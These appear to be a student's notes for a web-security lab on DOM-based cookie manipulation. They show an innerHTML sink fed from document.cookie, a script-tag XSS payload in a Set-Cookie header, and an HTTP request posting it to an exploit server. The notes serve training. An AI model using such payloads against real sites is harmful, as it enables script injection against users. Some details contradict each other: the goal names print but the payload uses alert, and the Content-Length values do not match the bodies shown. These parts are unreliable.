---
course: Web Security
topic: DOM-based Vulnerabilities
tags: [web-security]
---

## Injecting Malicious Cookies

### Goal of the Lab

The goal of this lab is to inject a malicious cookie that will cause an XSS vulnerability on a different page and call the `print` function. We will use the exploit server to direct the victim to the correct pages.

### Steps to Solve the Lab

1. **Identify the Vulnerable Code**: Look for JavaScript code that processes cookies directly.
2. **Inject the Malicious Cookie**: Set a cookie with the necessary payload to trigger the XSS vulnerability.
3. **Use the Exploit Server**: Direct the victim to the correct pages using the exploit server.

#### Example: Injecting a Malicious Cookie

Let's assume the vulnerable JavaScript code looks like this:

```javascript
document.getElementById("content").innerHTML = decodeURIComponent(document.cookie);
```

To exploit this vulnerability, we need to set a cookie with a payload that will execute JavaScript when the page loads. For example:

```http
Set-Cookie: xss_payload=<script>alert('XSS');</script>
```

### Full HTTP Request and Response

Here is a complete example of setting the cookie and the resulting HTTP request and response:

```http
POST /set-cookie HTTP/1.1
Host: exploit-server.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 26

cookie=xss_payload=%3Cscript%3Ealert(%27XSS%27)%3B%3C%2Fscript%3E
```

```http
HTTP/1.1 200 OK
Date: Tue, 01 Aug 2023 12:00:00 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 12

Cookie set successfully
```

### Expected Result

When the victim visits the page with the injected cookie, the JavaScript payload will be executed, triggering the XSS vulnerability.

---
<!-- nav -->
[[04-Identifying Insecure JavaScript|Identifying Insecure JavaScript]] | [[Web Security (PortSwigger)/06-DOM-based Vulnerabilities/05-Lab 5 DOM based cookie manipulation/00-Overview|Overview]] | [[06-Understanding DOM-Based Vulnerabilities|Understanding DOM-Based Vulnerabilities]]
